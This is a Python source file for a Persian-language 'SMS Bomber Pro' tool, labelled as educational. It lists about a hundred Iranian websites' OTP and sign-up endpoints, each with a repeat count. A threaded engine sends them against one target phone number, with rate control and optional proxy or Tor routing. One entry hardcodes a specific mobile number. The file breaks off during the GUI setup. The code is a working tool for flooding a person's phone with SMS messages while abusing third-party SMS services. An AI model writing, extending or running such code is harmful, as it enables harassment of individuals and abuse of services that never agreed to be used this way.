import sys
import subprocess
import importlib
import math
import threading
import time
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- ۱. نصب خودکار پیش‌نیازها ----------
REQUIRED = ["requests", "customtkinter"]
def install_dependencies():
    for lib in REQUIRED:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"📦 نصب {lib} ...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_dependencies()

import customtkinter as ctk
from tkinter import messagebox, END

# ---------- ۲. تنظیمات ظاهری ----------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ---------- ۳. API Templates (null / true / false اصلاح‌شده) ----------
API_TEMPLATES = [
    {
        "source": "neshan.org",
        "url": "https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9",
        "method": "GET",
        "capacity": 10,
        "ticket": 20
    },
    {
        "source": "#karnaval.ir",
        "url": "https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create",
        "json": {
            "campaignId":"000000000000000000000001",
            "mobile":"0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 5
    },
    {
        "source": "balad.ir",
        "url": "https://account.api.balad.ir/api/web/auth/login/",
        "json": {
            "phone_number":"0{phone}",
            "os_type":"W"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 30
    },
    {   
        "source": "keylid.com",
        "url": "https://api.accounts.keylid.com/api/auth/v2/users/register/",
        "json": {
            "phone_number":"98{phone}",
            "srv":"itunes"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 34
    },
    {
        "source": "vmusic.ir",
        "url": "https://api.vmusic.ir/auth/otp/request",
        "json": {
            "mobile":"0{phone}"
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 20
    },
    {   
        "source": "nazdikeh.com",
        "url": "https://www.nazdikeh.com/api/customers/login-register",
        "data": {
            "step": 1,
            "ReturnUrl": "/",
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 30,
        "ticket": 54
    },
    {
        "source": "janebi.com",
        "url": "https://janebi.com/signin",
        "data": {
            "user_mobile":"0{phone}",
            "confirm_code": "",
            "popup": 1,
            "signin": 1
        },
        "method": "POST",
        "capacity": 30,
        "ticket": 44
    },
    {
        "source": "mizamon.com",
        "url": "https://mizamon.com/wp-admin/admin-ajax.php",
        "data": {
            "login_method": "code",
            "phone_number": "0{phone}",
            "action": "ehraz_sms_otp_phone_verify",
            "ehraz_nonce": "1d51bec07c"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 32
    },
    {
        "source": "sepehrcc.com",
        "url": "https://app.sepehrcc.com/newapi/v1/Auth/Register/Mobile/0{phone}",
        "method": "GET",
        "capacity": 39,
        "ticket": 62
    },
    {
        "source": "70kala.ir",
        "url": "https://70kala.ir/wp-json/pinova/user/authenticate",
        "json": {
            "identifier": "0{phone}"
        },
        "method": "POST",
        "capacity": 12,
        "ticket": 36
    },
    {
        "source": "#mobile140.com",
        "url": "https://eloquent-feistel-xpkrs3vmp6.liara.run/api/send",
        "json": {
            "type": "event",
            "payload": {
                "website": "32e11191-2e9b-41df-80ca-fb209d727569",
                "hostname": "mobile140.com", "screen": "1566x364", 
                "language": "en-US", 
                "url":"/login?view=confirm&mobile=0{phone}&exist=false&redirect=/",
                "referrer":"/login?redirect=/"
            }
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 43
    },
    {
        "source": "aloghesti.com",
        "url": "https://api.aloghesti.com/api/v1/initial-user",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 38
    },
    {
        "source": "doozshop.com",
        "url": "https://doozshop.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "mobile_login",
            "mobile": "0{phone}",
            "step": "send_code"
        },
        "method": "POST",
        "capacity": 22,
        "ticket": 38
    },
    {   
        "source": "iranmojo.com",
        "url": "https://iranmojo.com/wp-admin/admin-ajax.php",
        "data": {
            "recaptcha_token": None,
            "phone": "09377972212",
            "controller": "auth-register_phone",
            "action": "iranmojo_guest",
            "dev": 2024
        },
        "method": "POST",
        "capacity": 32,
        "ticket": 47
    },
    {
        "source": "#19kala.com",
        "url": "https://www.19kala.com/users/register",
        "json": {
            "mobile": "0{phone}",
            "password": "12345678e",
            "agree": 1
        },
        "method": "POST",
        "capacity": 17,
        "ticket": 43
    },
    {
        "source": "#abadis.ir",
        "url": "https://abadis.ir/user/ajaxcmd/registernew/",
        "data": {
            "loginID": "0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 29
    },
    {
        "source": "#alibaba.ir",
        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "json": {
            "phoneNumber": "{phone}"
        },
        "method": "POST",
        "capacity": 8,
        "ticket": 62
    },
    {
        "source": "#anardoni.com",
        "url": "https://api.anardoni.com/api/v2/auth/v2/send_code",
        "json": {
            "mobile": "0{phone}",
            "verify_code_type": "login"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 43
    },
    {
        "source": "#anten.ir",
        "url": "https://api2.anten.ir/ids/api/auth/register",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#azki.com",
        "url": "https://www.azki.com/api/core/v2/app/auth/check-login-availability/",
        "json": {
            "phoneNumber": "0{phone}",
            "origin": "www.azki.com"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#banimode.com",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#boghrat.com",
        "url": "https://admapi.boghrat.com/boghratsite/Account/RegisterOTP",
        "json": {
            "Phonenumber": "0{phone}",
            "recaptcha": None,
            "AppointmentCode": ""
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#dastyar.io",
        "url": "https://api.dastyar.io/express/subscription/sendSms",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#delino.com",
        "url": "https://www.delino.com/User/PreRegister",
        "data": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#ebpnovin.com",
        "url": "https://www.ebpnovin.com/index.php?route=users/login",
        "data": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#esam.ir",
        "url": "https://api.esam.ir/api/account/v3/RegisterUserv3",
        "json": {
            "mobile": "0{phone}",
            "present_type": "WebApp",
            "registration_method": 0,
            "serialNumber": ""
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#files.ir",
        "url": "https://my.files.ir/api/v1/mobile/sms/forgot-password/send",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#flytoday.ir",
        "url": "https://www.flytoday.ir/api/collect",
        "json": {
            "plaintext": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#hiss.ir",
        "url": "https://hiss.ir/bakala/ajax/send_code/",
        "data": {
            "action": "bakala_send_code",
            "phone_email": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#iranconcert.com",
        "url": "https://www.iranconcert.com/user/check",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#iranecar.ir",
        "url": "https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo",
        "json": {
            "emailOrNumber": "0{phone}",
            "userType": "siteUser"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#itoll.com",
        "url": "https://app.itoll.com/api/v1/auth/login",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#kanape.ir",
        "url": "https://api.kanape.ir/v4/auth/otp",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 9,
        "ticket": 0
    },
    {
        "source": "#lastsecond.ir",
        "url": "https://api.lastsecond.ir/auth/register/token",
        "json": {
            "firstName": "\u00da\u2020",
            "lastName": "\u00d9\u201a",
            "username": "0{phone}",
            "referralCode": "",
            "termsAndConditions": True
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#lenz.ir",
        "url": "https://api-v3.lenz.ir/api/v3/user-management/otp/register",
        "json": {
            "msisdn": "98{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#malltina.com",
        "url": "https://api.malltina.com/api/v2/check-user",
        "json": {
            "user": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#mizito.ir",
        "url": "https://app.mizito.ir/capi/session/register",
        "json": {
            "step": 1,
            "activate_method": "sms",
            "email": "",
            "phone": "0{phone}",
            "username": "0{phone}",
            "pin_code": "",
            "firstname": "",
            "lastname": "",
            "workspace_name": "",
            "password": "",
            "repassword": "",
            "teammates": [
                {
                    "name": "",
                    "email_phone": ""
                }
            ],
            "validated": False
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#netbarg.com",
        "url": "https://netbarg.com/tehran/users/loginByMobile/",
        "json": {
            "_method": "POST",
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#okcs.com",
        "url": "https://okcs.com/users/mobilelogin",
        "data": {
            "mobile": "0{phone}",
            "url": "https://okcs.com/"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#ravandarman.com",
        "url": "https://papi.ravandarman.com/register/fast",
        "json": {
            "firstName": "f",
            "lastName": "q",
            "gender": 0,
            "registerField": "tel",
            "termsAndConditions": True,
            "tel": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#sheypoor.com",
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "json": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#simcart.com",
        "url": "https://simcart.com/api/v1/users/login-v2/login-type/",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 0
    },
    {
        "source": "abantether.com",
        "url": "https://api.abantether.com/api/v2/auths/register/phone/send",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "abrehamrahi.ir",
        "url": "https://abrehamrahi.ir/api/v6/profile/auth/generate-code/",
        "json": {
            "phone": "{phone}",
            "prefix": "+98"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 63
    },
    {
        "source": "achareh.co",
        "url": "https://api.achareh.co/v2/accounts/login/?web=true",
        "json": {
            "phone": "+98{phone}",
            "context": "general"
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 65
    },
    {
        "source": "andarz.io",
        "url": "https://api.andarz.io/api/v2/auth/signup/otp/",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "axon.me",
        "url": "https://axon.me/services/api/identity-service/v1/users/register-login/phr",
        "json": {
            "phoneNumber": "0{phone}",
            "serviceName": "AXON",
            "needTag": True,
            "sendAudioOtp": False
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 64
    },
    {
        "source": "balad.ir",
        "url": "https://account.api.balad.ir/api/web/auth/login/",
        "json": {
            "phone_number": "0{phone}",
            "os_type": "W"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "basalam.com",
        "url": "https://services.basalam.com/web/v1/auth/captcha/otp-request",
        "json": {
            "mobile": "0{phone}",
            "client_id": "11",
            "login_by_backup_mobile": False
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 14
    },
    {
        "source": "bertina.ir",
        "url": "https://llm.bertina.ir/api/auth/send-otp",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "bimebazar.com",
        "url": "https://bimebazar.com/accounts/api/login_sec/",
        "json": {
            "username": "0{phone}",
            "type": "sms"
        },
        "method": "POST",
        "capacity": 7,
        "ticket": 11
    },
    {
        "source": "bitpin.ir",
        "url": "https://api-sejel.bitpin.ir/v1/usr/auth/authentication/",
        "json": {
            "password": "12345678e",
            "resend": False,
            "use_voice_call": False,
            "phone": "0{phone}",
            "device_type": "web"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "boofai.com",
        "url": "https://heimdall.boofai.com/api/v1/otp/send",
        "json": {
            "cellphone": "+98{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "booking.ir",
        "url": "https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/",
        "json": {
            "mobile": "{phone}",
            "countryCode": "ir"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "cafebazaar.ir",
        "url": "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",
        "json": {
            "properties": {
                "language": 2,
                "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
                "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
                "clientVersion": "web"
            },
            "singleRequest": {
                "getOtpTokenRequest": {
                    "username": "98{phone}"
                }
            }
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 11
    },
    {
        "source": "digikala.com",
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "json": {
            "backUrl": "/",
            "username": "0{phone}",
            "otp_call": False,
            "hash": None
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "divar.ir",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 11
    },
    {
        "source": "drnext.ir",
        "url": "https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token",
        "json": {
            "source": "besina",
            "mobile": "0{phone}",
            "key": "U2FsdGVkX1+zCbHc0CmLAG4ebLlQNqHSophwTnPEM0FoXqoRPoDTw++WvlGiPsxHCr4zVSSWjJjbvbep14CVNA=="
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 17
    },
    {
        "source": "drsaina.com",
        "url": "https://www.drsaina.com/api/v2/authentication/request-totp",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "elanza.com",
        "url": "https://api.elanza.com/auth/request",
        "json": {
            "contact": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "eligasht.com",
        "url": "https://api2.eligasht.com/api/account/register",
        "json": {
            "userName": "0{phone}",
            "recaptchaToken": None
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "eseminar.tv",
        "url": "https://api.eseminar.tv/api/v1/auth/otp/send",
        "json": {
            "method": "register",
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 14
    },
    {
        "source": "faradars.org",
        "url": "https://api.faradars.org/api/client/v1/auth/otp",
        "json": {
            "mobile": "0{phone}",
            "digits": 5,
            "platforms": "web",
            "source": "faradars",
            "recaptcha_token": ""
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "fidibo.com",
        "url": "https://api.fidibo.com/identity/login/prepare",
        "json": {
            "username": "98-{phone}"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 32
    },
    {
        "source": "footballi.net",
        "url": "https://api.footballi.net/api/v2/user/check",
        "json": {
            "login": "0{phone}",
            "country_code": "+98"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "gapfilm.ir",
        "url": "https://core.gapfilm.ir/api/v3.2/Account/Login",
        "json": {
            "Method": 1,
            "PhoneNo": "{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "gisheh7.ir",
        "url": "https://gateway.gisheh7.ir/user/v1/public/auth/otp/generate",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "gsm.ir",
        "url": "https://marketplace.gsm.ir/api/v1/user/login/",
        "json": {
            "phone_number": "+98{phone}"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 32
    },
    {
        "source": "haal.ir",
        "url": "https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist",
        "json": {
            "Mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 20
    },
    {
        "source": "hamyarwp.com",
        "url": "https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081",
        "data": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "metisai.ir",
        "url": "https://api.metisai.ir/api/v1/client/phone-verification/request-otp",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 39,
        "ticket": 42
    },
    {
        "source": "mrbilit.ir",
        "url": "https://content.mrbilit.ir/sms/get_app/send?to=0{phone}",
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "mrbilit2.ir",
        "url": "https://auth.mrbilit.ir/api/Token/send?mobile=0{phone}",
        "method": "GET",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "namava.ir",
        "url": "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request",
        "json": {
            "UserName": "+98{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "niazerooz.com",
        "url": "https://my.niazerooz.com/api/account/requestotp",
        "json": {
            "mobile": "0{phone}",
            "registerReturnUrl": ""
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "nobat.ir",
        "url": "https://api.nobat.ir/patient/login/phone",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "okala.com",
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "json": {
            "mobile": "0{phone}",
            "deviceTypeCode": 10,
            "confirmTerms": True,
            "notRobot": False,
            "otpType": 0,
            "ValidationCodeCreateReason": 5,
            "OtpApp": 0,
            "IsAppOnly": False
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "okian.ai",
        "url": "https://okian.ai/api/auth/submit-phone-number",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "pezeshket.com",
        "url": "https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2",
        "json": {
            "mobileNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "quera.org",
        "url": "https://quera.org/accounts/api/register/phone/otp",
        "json": {
            "phone_number": "{phone}",
            "country_code": "+98",
            "captcha_token": ""
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "rhino.ir",
        "url": "https://rhino-api.smartbytes.ir/auth/send-otp",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 43
    },
    {
        "source": "ring.ir",
        "url": "https://ring.ir/api/v1/auth/otp",
        "json": {
            "mobile": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "roboo.ir",
        "url": "https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0{phone}&code=1302817798429812",
        "method": "POST",
        "capacity": 20,
        "ticket": 27
    },
    {
        "source": "salamati24.com",
        "url": "https://www.salamati24.com/api/activationcode?mobile=0{phone}&as_register=1&roleId=-2",
        "method": "GET",
        "capacity": 20,
        "ticket": 13
    },
    {
        "source": "sanjagh.pro",
        "url": "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell",
        "json": {
            "cell": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "sibche.com",
        "url": "https://api.sibche.com/profile/sendCode",
        "json": {
            "mobile": "0{phone}",
            "spec-g": None,
            "g-recaptcha-response": "null"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "skyroom.online",
        "url": "https://www.skyroom.online/auth/api/authenticate",
        "json": {
            "mobile_number": "0{phone}",
            "country_code": "98"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "tabdeal.org",
        "url": "https://api-web.tabdeal.org/register/",
        "json": {
            "phone_or_email": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 43
    },
    {
        "source": "takhfifan.com",
        "url": "https://takhfifan.com/v6/api/magento/login/init",
        "json": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "talasea.ir",
        "url": "https://api.talasea.ir/api/auth/sentOTP",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 65
    },
    {
        "source": "tapsi.ir",
        "url": "https://api.tapsi.ir/api/v2.2/user",
        "json": {
            "credential": {
                "phoneNumber": "0{phone}",
                "role": "DRIVER"
            },
            "otpOption": "SMS"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 68
    },
    {
        "source": "telewebion.ir",
        "url": "https://gateway.telewebion.ir/shenaseh/api/v2/auth/step-one",
        "json": {
            "phone": "{phone}",
            "code": "98",
            "smsStatus": "1",
            "notification_method": "sms"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "tetherland.com",
        "url": "https://service.tetherland.com/api/v5/login-register",
        "json": {
            "mobile": "0{phone}",
            "device_info": {
                "brand": "",
                "model": "",
                "browserVersion": "147.0",
                "app_version": "",
                "by": "web",
                "osName": "Windows",
                "osVersion": "11",
                "browserName": "Firefox",
                "platform": "web",
                "name": "Windows",
                "device": "web"
            },
            "otp_type": "sms",
            "device": "web"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "torob.com",
        "url": "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}&source=next_desktop&_landing_page=home",
        "method": "GET",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "tosinso.com",
        "url": "https://tosinso.com/api/auth/send-code",
        "json": {
            "type": "mobile",
            "value": "{phone}",
            "countryCode": "+98"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "uploadkon.ir",
        "url": "https://uploadkon.ir/ucp.php?go=sendotp",
        "data": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "virgool.io",
        "url": "https://virgool.io/api2/app/auth/verify",
        "json": {
            "identifier": "+98{phone}",
            "method": "phone",
            "type": "register"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "vmusic.ir",
        "url": "https://api.vmusic.ir/auth/otp/request",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "wisgoon.com",
        "url": "https://gateway.wisgoon.com/api/v8/auth/login/",
        "json": {
            "phone": "+98{phone}",
            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "yarai.ir",
        "url": "https://chat.yarai.ir/api/v1/otps/request-otp",
        "json": {
            "phone": "0{phone}",
            "isAndroid": False
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "zap-express.com",
        "url": "https://api.zap-express.com/fr/Registration/SendVerificationCode",
        "json": {
            "mobile": "0{phone}",
            "registrationCategoryId": 1,
            "representativeCode": "",
            "utmInfo": {
                "utM_Source": "alopeyk",
                "utM_Medium": "online",
                "utM_Campaign": "site",
                "utM_Content": "",
                "utM_Term": ""
            }
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "zigap.ir",
        "url": "https://gateway.zigap.ir/api/v1.9/authenticate/sendotp",
        "json": {
            "phoneNumber": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    }
]

# ---------- ۴. Token Bucket ----------
class TokenBucket:
    def __init__(self, rate: float):
        self.rate = rate
        self.tokens = 0.0
        self.last_time = time.time()
        self.lock = threading.Lock()

    def consume(self):
        with self.lock:
            now = time.time()
            self.tokens += (now - self.last_time) * self.rate
            self.last_time = now
            if self.tokens > self.rate:
                self.tokens = self.rate
            if self.tokens >= 1:
                self.tokens -= 1
                return True
            else:
                sleep_time = (1 - self.tokens) / self.rate
                time.sleep(sleep_time)
                self.tokens = 0
                self.last_time = time.time()
                return True

# ---------- ۵. Utility Functions ----------
def send_single_request(api: dict, phone: str, proxy: dict, bucket: TokenBucket) -> bool:
    bucket.consume()  # کنترل نرخ
    url = api["url"].replace("{phone}", phone)
    method = api.get("method", "GET").upper()
    headers = api.get("headers", {})
    data = api.get("data")
    json_data = api.get("json")

    if data:
        data = {k: (v.replace("{phone}", phone) if isinstance(v, str) else v) for k, v in data.items()}
    if json_data:
        def replace_phone(obj):
            if isinstance(obj, str):
                return obj.replace("{phone}", phone)
            elif isinstance(obj, dict):
                return {k: replace_phone(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [replace_phone(item) for item in obj]
            return obj
        json_data = replace_phone(json_data)

    try:
        if method == "GET":
            resp = requests.get(url, params=data or json_data, headers=headers, proxies=proxy, timeout=15)
        elif method == "POST":
            if json_data:
                resp = requests.post(url, json=json_data, headers=headers, proxies=proxy, timeout=15)
            else:
                resp = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=15)
        else:
            return False

        if resp.status_code in range(200, 300):
            try:
                body = resp.json()
                if isinstance(body, dict):
                    if body.get("error") or body.get("message") in ("failed", "error"):
                        return False
            except:
                pass
            return True
        return False
    except Exception:
        return False

# ---------- ۶. Engine ----------
class Engine:
    def __init__(self, phone: str, proxy: str = None, rate: float = 20.0,
                 success_target: int = None, log_callback=None):
        self.phone = phone
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.bucket = TokenBucket(rate)
        self.success_target = success_target
        self.log = log_callback if log_callback else lambda msg: None
        self.stop_flag = False
        self.stats = {"total": 0, "success": 0, "fail": 0}
        self.start_time = 0
        self.max_workers = max(1, min(10, int(rate)))

    def run_all(self, update_callback=None):
        self.stop_flag = False
        self.stats = {"total": 0, "success": 0, "fail": 0}
        self.start_time = time.time()
        tasks = []
        self.log(f"🚀 شروع ارسال به {self.phone} با نرخ {self.bucket.rate} req/s...")

        for api in API_TEMPLATES:
            if self.stop_flag:
                break
            capacity = api.get("capacity", 0)
            if capacity <= 0:
                continue
            for _ in range(capacity):
                if self.stop_flag:
                    break
                tasks.append(api)

        self.log(f"📋 {len(tasks)} درخواست آماده شد.")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_api = {
                executor.submit(send_single_request, api, self.phone, self.proxy, self.bucket): api
                for api in tasks
            }

            for future in as_completed(future_to_api):
                if self.stop_flag:
                    break
                api = future_to_api[future]
                try:
                    result = future.result()
                except:
                    result = False
                self.stats["total"] += 1
                if result:
                    self.stats["success"] += 1
                    if self.stats["success"] % 10 == 0:
                        self.log(f"✅ موفق از {api['source']}")
                else:
                    self.stats["fail"] += 1
                    if self.stats["fail"] % 10 == 0:
                        self.log(f"❌ خطا از {api['source']}")
                if update_callback:
                    update_callback(self.stats, self.start_time)
                if self.success_target and self.stats["success"] >= self.success_target:
                    self.stop_flag = True
                    self.log(f"🎯 به هدف {self.success_target} رسیدیم. توقف...")
                    break

        self.log(f"🏁 پایان. مجموع: {self.stats['total']} | موفق: {self.stats['success']} | خطا: {self.stats['fail']}")

    def stop(self):
        self.stop_flag = True
        self.log("🛑 توقف توسط کاربر...")

# ---------- ۷. GUI (کاملاً راست‌چین) ----------
class SMSBomberGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("SMS Bomber Pro - نسخه آموزشی -SkyBit")
        self.geometry("950x750")
        self.minsize(850, 650)

        self.engine = None
        self.thread = None

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(6, weight=1)

        self.header_label = ctk.CTkLabel(self, text="ارسال پیامک SkyBit (آموزشی)",
                                         font=ctk.CTkFont(size=22, weight="bold"),
                                         anchor="e")
        self.header_label.grid(row=0, column=0, pady=15, padx=20, sticky="ew")

        settings_frame = ctk.CTkFrame(self)
        settings_frame.grid(row=1, column=0, padx=20, pady=(0,10), sticky="ew")
        settings_frame.grid_columnconfigure(0, weight=1)
        settings_frame.grid_columnconfigure(1, weight=0)

        ctk.CTkLabel(settings_frame, text=":شماره موبایل", anchor="e").grid(row=0, column=1, padx=(10,20), pady=5, sticky="e")
        self.phone_entry = ctk.CTkEntry(settings_frame, placeholder_text="09xxxxxxxxx", width=180, justify="right")
        self.phone_entry.grid(row=0, column=0, padx=(20,10), pady=5, sticky="w")

        ctk.CTkLabel(settings_frame, text=":پروکسی (اختیاری)", anchor="e").grid(row=1, column=1, padx=(10,20), pady=5, sticky="e")
        self.proxy_entry = ctk.CTkEntry(settings_frame, placeholder_text="socks5://127.0.0.1:9050", width=300, justify="right")
        self.proxy_entry.grid(row=1, column=0, padx=(20,10), pady=5, sticky="w")

